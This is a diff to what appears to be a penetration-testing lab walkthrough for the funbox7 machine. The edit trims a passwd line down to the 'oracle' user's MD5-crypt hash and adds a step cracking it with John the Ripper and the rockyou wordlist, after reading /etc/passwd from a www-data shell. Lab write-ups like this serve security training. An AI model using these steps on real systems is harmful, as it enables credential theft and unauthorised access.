@@ -257,5 +257,12 @@ www-data@funbox7:/var/www/html$ cat /etc/passwd
 ```
 ![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/900e0fa2-c796-4c98-a8f3-a0a3cc36e246)
 ```
-oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
+$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0
 ```
+
+Crack the hash
+```
+> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+![image](https://github.com/karanshergill/OffSec-Play/assets/83878909/1e25891b-54f4-4a57-9885-9d2edf71ffa2)
+
